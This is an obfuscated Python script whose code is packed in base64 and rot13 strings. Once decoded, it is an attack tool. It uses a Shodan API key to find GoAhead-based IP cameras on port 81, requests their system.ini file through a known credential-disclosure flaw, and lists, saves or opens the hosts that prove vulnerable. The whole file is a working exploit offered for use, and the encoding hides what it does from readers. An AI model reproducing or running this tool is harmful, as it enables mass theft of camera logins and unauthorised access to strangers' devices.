# Python code obfuscated by www.development-tools.net 
 

# Python code obfuscated by www.development-tools.net 
 

# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = ''
love = 'Bt0XVlNtVPNtVTSjnFN9VTyhpUI0XPqSoaEypvO2LJkcMPOOHRxtn2I5BvNaXD0XVlNtVPNtVTyzVTSjnFN9CFNaWmbAPvZtVPNtVPNtpTSmpj0XVlNtVPNtVTIfp2H6QDbwVPNtVPNtVTgyrFN9VUAbo2Euov5GnT9xLJ4bLKOcXD0XVlNtVPNtVPOeMKxhp2IupzAbXPqlMJSfoG0vE29OnTIuMPVfVTEioJScow0vBwtkVvpcQDbwVPNtVPNtVUqcqTtto3OyovtaLKOcK2gyrF5wo25znJpaYPNaqlpcVTSmVTH6QDbwVPNtVPNtVPOyYaqlnKEyXPqoDIOWKFpcQDbwVPNtVPNtVTAiozLtCFOwo25znJqjLKWmMKVhHzS3D29hMzyaHTSlp2IlXPxAPvZtVPNtVPNtL29hMv5lMJSxXPWupTysn2I5YzAiozMcMlVfVTIhL29xnJ5aCFq1qTLgBPpcQDbwVPNtVPNtVTAiozLhp2I0XPWOHRxvYPNvDIOWVvjtLKOcXD0XVlNtVPNtVPOwo25zYaqlnKEyXT9jMJ4bVzSjnI9eMKxhL29hMzyaVvjtVapvYPOyozAiMTyhMm0aqKEzYGtaXFxAPvZtVPNtVPNtV29mYaA5p3EyoFtaL2kmVUk8VTAfMJSlWlxAPvZtVPNtVPNtLaWyLJfAPvZtVPNtVTI4L2IjqPOYMKyvo2SlMRyhqTIlpaIjqQbAPvZtVPNtVPNtpUWcoaDbVykhHUWiM3WuoFOmqT9jpTIxYvVcQDbwVPNtVPNtVTI4nKDbXD0XVlNtVPNtMKuwMKO0Bt0XVlNtVPNtVPOjpzyhqPtvI3WiozptDIOWVTgyrFRtIUW5VTSaLJyhYykhVvxAPvZtMJkmMGbAPvZtVPOwo25zVQ0tL29hMzyapTSlp2IlYyWuq0AiozMcM1OupaAypvtcVPNtVN0XVlNtVTAiozLhpzIuMPtvLKOcK2gyrF5wo25znJpvYPOyozAiMTyhMm0aqKEzYGtaXD0XQDbwVTgyrFN9VTAiozLhM2I0XPWOHRxvYPNvLKOcVvxAPt0XLKOcVQ0tp2uiMTShYyAbo2EuovueMKxcQDbAPz51oI9iMy92qJkhMKWuLzkyVQ0tJ10APzyjplN9VSgqQDc0MKWgnJ5uqTIxVQ0tEzSfp2HAPt0XMTIzVUA0XPx6QDbAPvO0pax6QDbtVUWyp3IfqUZtCFOupTxhp2IupzAbXUWypKIyp3DcQDbtMKuwMKO0VUAbo2Euov5yrTAypUEco24hDIOWEKWlo3V6QDbtVT9mYaWyoJ92MFtaLKOcK2gyrF5wo25znJpaXD0XVPOjpzyhqPtaI3WiozptDIOWVTgyrFSpoyWyp3EupaDtqTuyVUOlo2qlLJ0tLJ5xVTIhqTIlVUEbMFOwo3WlMJA0VRSDFF4aXD0XVPOyrTy0XPxAPvOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbtVUOlnJ50XRMipzHhGRyUFSEFEHEsEIttXlNvKT5Dpz9apzSgVUA0o3OjMJDhVvxAPvNtMKucqPtcQDbAPvOzo3VtpzImqJk0VTyhVUWyp3IfqUAoW21uqTAbMKZaKGbAPvNtnKOmYzSjpTIhMPuzo3WgLKDbpzImqJk0JlqcpS9mqUVaKFxcQDbAPvOzo3VtnKNtnJ4toTymqPumMKDbnKOmXFx6QDbtVUElrGbAPt0XVPNtpUWcoaDbMvWHMKA0nJ5aVUgTo3WyYxAMDH4tXlOcpU0vXD0XVPNtpvN9VTqyqPuzVzu0qUN6Yl97nKO9BwtkY3A5p3EyoF5cozx/oT9anJ51p2HzoT9anJ5jLKZvYPO0nJ1yo3I0CGRjXD0XQDbtVPO3nKEbVT9jMJ4bMvqwLJ1ypzSsr2yjsF5cozxaYPNaq2VaXFOuplOzBt0XVPNtVTLhq3WcqTHbpv5wo250MJ50XD0XQDbtVPOcMvOipl5mqTS0XTLaL2SgMKWuK3gcpU0hnJ5cWlxhp3Esp2y6MFN+CFOcoaDbWmRjZQNjWlxto3Vto3Zhp3EuqPuzW2AuoJIlLI97nKO9YzyhnFpcYaA0K3AcrzHtCG0tnJ50XPpkAmtaXFOipvOipl5mqTS0XTLaL2SgMKWuK3gcpU0hnJ5cWlxhp3Esp2y6MFN9CFOcoaDbWmR3ZFpcVT9lVT9mYaA0LKDbMvqwLJ1ypzSsr2yjsF5cozxaXF5mqS9mnKcyVQ09VTyhqPtaAGDlWlxto3Vto3Zhp3EuqPuzW2AuoJIlLI97nKO9YzyhnFpcYaA0K3AcrzHtCG0tnJ50XPpkBQtaXGbAPvNtVPOipl5lMJ1iqzHbMvqwLJ1ypzSsr2yjsF5cozxaXD0XVPNtVUOlnJ50XRMipzHhGRyUFSEFEHEsEIttXlNaETIhnJIxKT4aXD0XVPNtMJkmMGbAPvNtVPOhqJ1so2MsqaIfozIlLJWfMF5upUOyozDbnKNcQDbtVPNtpUWcoaDbEz9lMF5ZFHqVIRqFEHIBK0ILVPftW0SwL2Imp2IxKT4aXD0XVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbtVPNtpUWcoaDbEz9lMF5ZFHqVISWSES9SJPNeVPqpoyOlo2qlLJ0tp3EipUOyMP5povpcQDbtVPNtM2kiLzSfVUEypz1cozS0MJDAPvNtVPO0MKWgnJ5uqTIxVQ0tIUW1MD0XVPNtVTWlMJSeQDbtVPNtV2I4nKDbXD0XVPOyrTAypUD6QDbtVPNtpUWcoaDbnKNfVRMipzHhGRyUFSEFEHEsEIttXlNtW25iqPOuqzScoTSvoTHhKT4aXD0XVPNtVTAioaEcoaIyQDcmqPtcQDbAPzyzVTkyovuhqJ1so2MsqaIfozIlLJWfMFxtCw0tnJ50XPpkWlx6QDbtVUEupz8lVQ0tEz9lMF5ZFHqVIRqFEHIBK0ILVPftp3ElXTkyovuhqJ1so2MsqaIfozIlLJWfMFxcQDcyoUAyBt0XVPO0LKWiZvN9VRMipzHhGRyUFSEFEHEsEIttXlOmqUVboTIhXT51oI9iMy92qJkhMKWuLzkyXFxAPt0XqTttCFOoW0yDWljtW1OCHyDaYPNaIIASHx5OGHHaYPNaHRSGH1qCHxDaYPNaGRSBEPqqQDc0MPN9VSgqQDbAPzyzVTkyovuhqJ1so2MsqaIfozIlLJWfMFxtCw0tnJ50XPpkWlx6QDbtplN9VUAyp3Aco24bXD0XQDbtq2y0nPOWozAlMJ1yoaEuoRWupvtaHUWiL2Imp2yhMlpfVT1urQ1fMJ4boaIgK29zK3M1oT5ypzSvoTHcXFOuplOvLKV6QDbtVUWurUHtCFNjQDbtVTMipvOcpTxtnJ4toaIgK29zK3M1oT5ypzSvoTH6QDbtVPNtqUW5Bt0XVPNtVPO1p2IlVQ0tGz9hMD0XVPNtVPOjLKAmq29lMPN9VR5iozHAPvNtVPNtMzyfMFN9VT9jMJ4bMvqwLJ1ypzSsr2yjnK0hnJ5cWljtW3VaYPOyozAiMTyhMm0aoTS0nJ4gZFpcQDbAPvNtVPNtqUW5Bt0XVPNtVPNtMTS0LFN9VTMcoTHhpzIuMPtcYaWypTkuL2HbW1k4ZQNaYPNaVPpcQDbtVPNtVPO3o3WxplN9VTEuqTRhp3OfnKDbXD0XVPNtVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbtVPNtVPOjpzyhqPuTo3WyYxkWE0uHHxIRK0ILVPftW1khHUWiM3WuoFOmqT9jpTIxYvpcQDbtVPNtVPOyrTy0XPxAPvNtVPNtMKuwMKO0Bt0XVPNtVPNtpUWcoaDbEz9lMF5ZFHqVISWSES9SJPNeVPqpoyAioJI0nTyhMlO3MJ50VUqlo25aYvpcQDbtVPNtVPOyrTy0XPxAPt0XVPNtVPOzo3VtnFOcovOlLJ5aMFufMJ4bq29lMUZcYGRcBt0XVPNtVPNtqUW5Bt0XVPNtVPNtVUOuM2HtCFOmYzqyqPu1pzj9MvqbqUEjBv8ir2yjnK06BQRaYPOuqKEbCFu3o3Wxp1gcKFjtq29lMUAonFfkKFxfVUEcoJIiqKD9ZGNcQDbtVPNtVPNtnJLtpTSaMF5mqTS0qKAsL29xMFN9CFNlZQN6QDbtVPNtVPNtVUExYzSjpTIhMPucpTxcQDbtVPNtVPNtVUExYzSjpTIhMPtaBQRaXD0XVPNtVPNtVPO0MP5upUOyozDbq29lMUAonI0cQDbtVPNtVPNtVUExYzSjpTIhMPu3o3Wxp1gcXmSqXD0XVPNtVPNtVPOuMPN9VTAhqUVbnKOcXD0XVPNtVPNtVPO0MP5upUOyozDbLJDhL291oaElrFxAPvNtVPNtVPNtMzyfMF5woT9mMFtcQDbtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPOipl5lMJ1iqzHbMvqwLJ1ypzSsr2yjnK0hnJ5cWlxAPvNtVPNtVPNtMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0Bt0XVPNtVPNtVPNtVUOlnJ50XRMipzHhGRyUFSEFEHEsEIttXlNaKT5Dpz9apzSgVUA0o3OjMJDhWlxAPvNtVPNtVPNtVPOyrTy0XPxAPvNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVUOup3ZAPvNtVPNtVPNtLzSlYz5yrUDbXD0XVPNtVPNtVPOvpzIunj0XQDbtVPNtVPNtpzIkqJImqPN9VTqyqPuzW2u0qUN6Yl97nKOcsGb4ZFpfVUEcoJIiqKDtCFNkZPjtqzIlnJM5VQ0tEzSfp2HfVTS1qTttCFOVISEDETyaMKA0DKI0nPu3o3Wxp1gcKFjtWlpcXD0XVPNtVPNtVTyzVUWypKIyp3Dhp3EuqUImK2AiMTHtCG0tZwNjBt0XVPNtVPNtVPO0MP5upUOyozDbnKOcXD0XVPNtVPNtVPO0MP5upUOyozDbWmtkWlxAPvNtVPNtVPNtqTDhLKOjMJ5xXUqipzEmJ2yqXD0XVPNtVPNtVPO0MP5upUOyozDbWlpcQDbtVPNtVPNtVTSxVQ0tL250pvucpTxcQDbtVPNtVPNtVUExYzSjpTIhMPuuMP5wo3IhqUW5XD0XVPNtVPNtVPOznJkyYzAfo3AyXPxAPvNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVT9mYaWyoJ92MFuzW2AuoJIlLI97nKOcsF5cozxaXD0XVPNtVPNtVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbtVPNtVPNtVPNtpUWcoaDbEz9lMF5ZFHqVISWSES9SJPNeVPqpoyOlo2qlLJ0tp3EipUOyMP4aXD0XVPNtVPNtVPNtVTI4nKDbXD0XVPNtVPNtVPOyrTAypUD6QDbtVPNtVPNtVPNtpTSmpj0XVPNtVPNtVPOvLKVhozI4qPtcQDbtVPNtVPNtVTWlMJSeQDbtVPNtVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbtVPNtVPNtVUOlnJ50XRMipzHhGRyUFSEFEHEsEIttXlNaKT5Dpz9apzSgVUA0o3OjMJDhWlxAPvNtVPNtVPNtMKucqPtcQDbtVPNtVPOyrTAypUD6QDbtVPNtVPNtVTAioaEcoaIyQDbtVPNtMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0Bt0XVPNtVPOjpzyhqPuTo3WyYxkWE0uHHxIRK0ILVPftW1khHUWiM3WuoFOmqT9jpTIxYvpcQDbtVPNtVTI4nKDbXD0XVPNtVTI4L2IjqQbAPvNtVPNtL29hqTyhqJHAPt0XnJLtoTIhXT51oI9iMy92qJkhMKWuLzkyXFN+CFOcoaDbWmRaXGbAPvOwo2k1oJ5mVQ0toTIhXUEbXD0XQDbtqTSvoTHtCFODpzI0qUyHLJWfMFu0nPxAPt0XVUExK2EuqTRtCFO0MSf6KD0XVUqbnJkyVUExK2EuqTR6QDbtVPNtqTSvoTHhLJExK3Wiqlu0MS9xLKEuJmcwo2k1oJ5mKFxAPvNtVPO0MS9xLKEuVQ0tqTEsMTS0LIgwo2k1oJ5mBy0APvOjpzyhqPuzW1khr3EuLzkysIkhWlxAPzIfnJLtqTIloJyhLKEyMPN9CFOHpaIyBt0XVTI4nKDbXD0XMJkmMGbAPvO0LKWiVQ0tEz9lMF5ZFHqVISWSES9SJPNeVUA0pvufMJ4boaIgK29zK3M1oT5ypzSvoTHcXD0XVUOlnJ50XPqQnTIwn2IxVTEyqzywMKZ6WljtEz9lMF5ZFHqVIRAMDH5sEIttXlOmqUVboTIhXTkcp3Dbp2I0XTyjplxcXFxcQDbtpUWcoaDbW1M1oT5ypzSvoTHtMTI2nJAypmbaYPO0LKWiYPNaKT4aXD0XVUOlnJ50XPqJqJkhMKWuLzkyVTEyqzywMKZtoz90VTMiqJ5xVFODoTIup2HtqUW5VTSaLJyhVTkuqTIlYvpcQDbAPt0XQDbAPt0XQDbAPt0XVlOcoKOipaDtp2uiMTShYPOipljtqKWfoTyvYaWypKIyp3DfVUWypKIyp3EmYPOupzqjLKWmMFjtL29hMzyapTSlp2IlYPOdp29hQDbwVTMlo20tpzIkqJImqUZtnJ1jo3W0VTqyqN0XVlOzpz9gVUWypKIyp3EmVTygpT9lqPOmMKAmnJ9hQDbwVTMlo20tL29fo3WuoJRtnJ1jo3W0VTyhnKDfVRMipzHfVRWuL2fAPvZtMaWioFOjpz9apzImpl5vLKVtnJ1jo3W0VRyhL3WyoJIhqTSfDzSlQDbwVTMlo20tpUWyqUE5qTSvoTHtnJ1jo3W0VSOlMKE0rIEuLzkyQDbwVTMlo20tpzIkqJImqUZhLKI0nPOcoKOipaDtFSEHHREcM2ImqRS1qTtAPvZtMaWioFOaMJ9wo2EypvOcoKOipaDtnKNAPt0XVlOjLKWmMKVtCFOupzqjLKWmMF5Opzq1oJIhqSOupaAypvtcQDbwVUOupaAypv5uMTEsLKWaqJ1yoaDbVv0gLKOcVvjtMTIzLKIfqQ1Bo25yXD0XVlOjLKWmMKVhLJExK2SlM3IgMJ50XPVgYJyjVvjtMTIzLKIfqQ1Bo25yXD0XVlOupzqmVQ0tpTSlp2IlYaOupaAyK2SlM3ZbXD0XQDbwVTEyMvOwqKA0o20bnKNcBt0XVlNtnJ5cqPuuqKEipzImMKD9IUW1MFxAPvZtVTyzVT9mYaOuqTthMKucp3EmXPqupTysn2I5YzAiozMcMlpcVQ09VRMuoUAyBt0XVlNtVUqbnJkyVSElqJH6QDbwVPNtVPO0pax6QDbwVPNtVPNtLKOcVQ0tnJ5jqKDbW0IhqTIlVUMuoTyxVRSDFFOeMKx6VPpcQDbwVPNtVPNtnJLtLKOcVQ09VPpaBt0XVlNtVPNtVPOjLKAmQDbwVPNtVPNtMJkmMGbAPvZtVPNtVPNtn2I5VQ0tp2uiMTShYyAbo2EuovuupTxcQDbwVPNtVPNtVTgyrF5mMJSlL2tbW3WyLJkgCFWUo0SbMJSxVvjtMT9gLJyhCFV6BQRvWlxAPvZtVPNtVPNtq2y0nPOipTIhXPqupTysn2I5YzAiozMcMlpfVPq3WlxtLKZtMGbAPvZtVPNtVPNtVTHhq3WcqTHbW1gOHRyqWlxAPvZtVPNtVPNtL29hMvN9VTAiozMcM3OupaAypv5FLKqQo25znJqDLKWmMKVbXD0XVlNtVPNtVPOwo25zYaWyLJDbVzSjnI9eMKxhL29hMzyaVvjtMJ5wo2Ecozp9W3I0Mv04WlxAPvZtVPNtVPNtL29hMv5mMKDbVxSDFFVfVPWOHRxvYPOupTxcQDbwVPNtVPNtVTAiozLhq3WcqTHbo3OyovtvLKOcK2gyrF5wo25znJpvYPNvqlVfVTIhL29xnJ5aCFq1qTLgBPpcXD0XVlNtVPNtVPNwo3Zhp3ymqTIgXPqwoUZtsUjtL2kyLKVaXD0XVlNtVPNtVPOvpzIunj0XVlNtVPNtMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0Bt0XVlNtVPNtVPOjpzyhqPtvKT5Dpz9apzSgVUA0o3OjMJDhVvxAPvZtVPNtVPNtMKucqPtcQDbwVPNtVPOyrTAypUD6QDbwVPNtVPNtVUOlnJ50XPWKpz9hMlOOHRxtn2I5VFOHpaxtLJqunJ4hKT4vXD0XVlNtMJkmMGbAPvZtVPOwo25zVQ0tL29hMzyapTSlp2IlYyWuq0AiozMcM1OupaAypvtcVPNtVN0XVlNtVTAiozLhpzIuMPtvLKOcK2gyrF5wo25znJpvYPOyozAiMTyhMm0aqKEzYGtaXD0XQDbwVPOeMKxtCFOwo25zYzqyqPtvDIOWVvjtVzSjnFVcQDbAPvZtVTSjnFN9VUAbo2Euov5GnT9xLJ4bn2I5XD0XQDbwVPOhqJ1so2MsqaIfozIlLJWfMFN9VSgqQDbwVPOcpUZtCFOonKOqQDbAPvZtVTEyMvOmqPtcBt0XQDbwVPNtMz9lVTyjVTyhVTkcp3Dbp2I0XTyjplxcBt0XVlNtVPO0pax6QDbAPvZtVPNtVUOlnJ50XTLvKT5HMKA0nJ5aVUgTo3WyYxAMDH4tXlOcpU0vXD0XVlNtVPNtpvN9VTqyqPuzVzu0qUN6Yl97nKO9BwtkY3A5p3EyoF5cozx/oT9anJ51p2HzoT9anJ5jLKZvYPO0nJ1yo3I0CGRjXD0XQDbwVPNtVPO3nKEbVT9jMJ4bMvqwLJ1ypzSsr2yjsF5cozxaYPNaq2VaXFOuplOzBt0XVlNtVPNtVTLhq3WcqTHbpv5wo250MJ50XD0XQDbwVPNtVPOcMvOipl5mqTS0XTLaL2SgMKWuK3gcpU0hnJ5cWlxhp3Esp2y6MFN+CFOcoaDbWmRjZQNjWlxto3Vto3Zhp3EuqPuzW2AuoJIlLI97nKO9YzyhnFpcYaA0K3AcrzHtCG0tnJ50XPpkAmtaXFOipvOipl5mqTS0XTLaL2SgMKWuK3gcpU0hnJ5cWlxhp3Esp2y6MFN9CFOcoaDbWmR3ZFpcVT9lVT9mYaA0LKDbMvqwLJ1ypzSsr2yjsF5cozxaXF5mqS9mnKcyVQ09VTyhqPtaAGDlWlxto3Vto3Zhp3EuqPuzW2AuoJIlLI97nKO9YzyhnFpcYaA0K3AcrzHtCG0tnJ50XPpkBQtaXGbAPvZtVPNtVPOipl5lMJ1iqzHbMvqwLJ1ypzSsr2yjsF5cozxaXD0XVlNtVPNtVUOlnJ50XRMipzHhGRyUFSEFEHEsEIttXlNaETIhnJIxWlxAPvZtVPNtVPOyrTy0XPxAPvZtVPNtVTIfp2H6QDbwVPNtVPNtoaIgK29zK3M1oT5ypzSvoTHhLKOjMJ5xXTyjXD0XVlNtVPNtVUOlnJ50XRMipzHhGRyUFSEUHxISGy9SJPNeVPqOL2Ayp3AyMSkhWlxAPvZtVPNtMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0Bt0XVlNtVPNtpUWcoaDbW1khHUWiM3WuoFOmqT9jpTIxYvpcQDbwVPNtVPOyrTy0XPxAPvZtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOsBt0XVlNtVPNtpUWcoaDbMvq7nKO9VT5iqPOuqzScoTSvoTHhWlxAPvZtVPNtVTI4nKDbXD0XVlNtp3DbXD0XQDbwVPO0MvN9VSfaFINaYPNaIIASHx5OGHHaYPNaHRSGH1qCHxDaYPNarzSfqKOuW10APvZtVUEaVQ0tJ10APt0XVlNtnJLtoTIhXT51oI9iMy92qJkhMKWuLzkyXFN+CFOcoaDbWmRaXGbAPvZtVPOmVQ0tp2Imp2yiovtcQDbAPvZtVPO3nKEbVRyhL3WyoJIhqTSfDzSlXPqDpz9wMKAmnJ5aWljtoJS4CJkyovuhqJ1so2MsqaIfozIlLJWfMFxcVTSmVTWupwbAPvZtVPNtpzS4qFN9VQNAPvZtVPNtMz9lVTyjnFOcovOhqJ1so2MsqaIfozIlLJWfMGbAPvZtVPNtVUElrGbAPvZtVPNtVPO1p2IlVQ0tGz9hMD0XVlNtVPNtVUOup3A3o3WxVQ0tGz9hMD0XVlNtVPNtVTMcoTHtCFOipTIhXTLaL2SgMKWuK3gcpTy9YzyhnFpfVPqlWljtMJ5wo2Ecozp9W2kuqTyhYGRaXD0XQDbwVPNtVPNtqUW5Bt0XVlNtVPNtVPOxLKEuVQ0tMzyfMF5lMJSxXPxhpzIjoTSwMFtaKUtjZPpfVPptWlxAPvZtVPNtVPNtq29lMUZtCFOxLKEuYaAjoTy0XPxAPvZtVPNtVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbwVPNtVPNtVUOlnJ50XPqpoyOlo2qlLJ0tp3EipUOyMP4aXD0XVlNtVPNtVPOyrTy0XPxAPvZtVPNtVPOyrTAypUD6QDbwVPNtVPNtVUOlnJ50XPqpoyAioJI0nTyhMlO3MJ50VUqlo25aYvpcQDbwVPNtVPNtVTI4nKDbXD0XQDbwVPNtVPNtMz9lVTxtnJ4tpzShM2HboTIhXUqipzEmXF0kXGbAPvZtVPNtVPNtqUW5Bt0XVlNtVPNtVPNtpTSaMFN9VUZhM2I0XUIloQ1zW2u0qUN6Yl97nKOcsGb4ZFpfVTS1qTt9XUqipzEmJ2yqYPO3o3Wxp1gcXmSqXFjtqTygMJ91qQ0kZPxAPvZtVPNtVPNtVTyzVUOuM2Hhp3EuqUImK2AiMTHtCG0tZwNjBt0XVlNtVPNtVPNtVUEaYzSjpTIhMPucpTxcQDbwVPNtVPNtVPNtqTphLKOjMJ5xXUqipzEmJ2yqXD0XVlNtVPNtVPNtVUEaYzSjpTIhMPu3o3Wxp1gcXmSqXD0XVlNtVPNtVPNtVPAuMQRtCFOcpPucpTxcQDbwVPNtVPNtVPNtqTphLKOjMJ5xXPquMQRhL291oaElrFpcQDbwVPNtVPNtVPNtMzyfMF5woT9mMFtcQDbwVPNtVPNtVPNtqUW5Bt0XVlNtVPNtVPNtVPNto3ZhpzIgo3MyXTLaL2SgMKWuK3gcpTy9YzyhnFpcQDbwVPNtVPNtVPNtMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0Bt0XVlNtVPNtVPNtVPNtpUWcoaDbW1khHUWiM3WuoFOmqT9jpTIxYvpcQDbwVPNtVPNtVPNtVPOyrTy0XPxAPvZtVPNtVPNtVPOyrTAypUD6QDbwVPNtVPNtVPNtVPOjLKAmQDbwVPNtVPNtVPNtLzSlYz5yrUDbXD0XQDbwVPNtVPNtVPOlMKS1MKA0VQ0tM2I0XTLanUE0pQbiY3gcpTy9BwtkWljtqTygMJ91qPN9VQRjYPO2MKWcMaxtCFOTLJkmMFjtLKI0nPN9VRuHISORnJqyp3EOqKEbXUqipzEmJ2yqYPNaWlxcQDbwVPNtVPNtVPOcMvOlMKS1MKA0YaA0LKE1p19wo2EyVQ09VQVjZQbAPvZtVPNtVPNtVPO0Ml5upUOyozDbnKOcXD0XVlNtVPNtVPNtVUEaYzSjpTIhMPu3o3Wxp1gcKFxAPvZtVPNtVPNtVPO0Ml5upUOyozDbWlpcQDbwVPNtVPNtVPNtV2SxZFN9VTyjXTyjnFxAPvZtVPNtVPNtVPO0Ml5upUOyozDbW2SxZF5wo3IhqUW5WlxAPvZtVPNtVPNtVPOznJkyYzAfo3AyXPxAPvZtVPNtVPNtVPO0pax6QDbwVPNtVPNtVPNtVPOipl5lMJ1iqzHbMvqwLJ1ypzSsr2yjnK0hnJ5cWlxAPvZtVPNtVPNtVPOyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6QDbwVPNtVPNtVPNtVPOjpzyhqPtaKT5Dpz9apzSgVUA0o3OjMJDhWlxAPvZtVPNtVPNtVPNtVTI4nKDbXD0XVlNtVPNtVPNtVTI4L2IjqQbA'
god = ''
destiny = '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